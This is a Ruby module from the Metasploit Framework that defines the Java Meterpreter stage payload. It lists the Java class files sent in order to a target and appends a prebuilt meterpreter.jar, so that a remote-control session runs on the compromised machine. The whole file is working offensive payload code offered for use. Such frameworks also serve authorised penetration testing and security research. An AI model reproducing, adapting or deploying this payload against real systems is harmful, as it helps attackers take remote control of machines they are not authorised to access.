##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/payload/java'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/meterpreter_java'
require 'msf/base/sessions/meterpreter_options'


module Metasploit3
  include Msf::Sessions::MeterpreterOptions

  # The stager should have already included this
  #include Msf::Payload::Java

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Java Meterpreter',
      'Description'   => 'Run a meterpreter server in Java',
      'Author'        => [
          'mihi', # all the hard work
          'egypt' # msf integration
        ],
      'Platform'      => 'java',
      'Arch'          => ARCH_JAVA,
      'PayloadCompat' =>
        {
          'Convention' => 'javasocket javaurl',
        },
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::Meterpreter_Java_Java))
    # Order matters.  Classes can only reference classes that have already
    # been sent.  The last .class must implement Stage, i.e. have a start()
    # method.
    #
    # The Meterpreter.class stage is just a jar loader, not really anything
    # to do with meterpreter specifically.  This payload should eventually
    # be replaced with an actual meterpreter stage so we don't have to send
    # a second jar.
    @stage_class_files = [
      [ "javapayload", "stage", "Stage.class" ],
      [ "com", "metasploit", "meterpreter", "MemoryBufferURLConnection.class" ],
      [ "com", "metasploit", "meterpreter", "MemoryBufferURLStreamHandler.class" ],
      # Must be last!
      [ "javapayload", "stage", "Meterpreter.class" ],
    ]
  end

  #
  # Override the Payload::Java version so we can load a prebuilt jar to be
  # used as the final stage; calls super to get the intermediate stager.
  #
  def generate_stage
    file = File.join(Msf::Config.data_directory, "meterpreter", "meterpreter.jar")
    met = File.open(file, "rb") {|f| f.read(f.stat.size) }

    # All of the dendencies to create a jar loader, followed by the length
    # of the jar and the jar itself.
    super + [met.length].pack("N") + met
  end

end
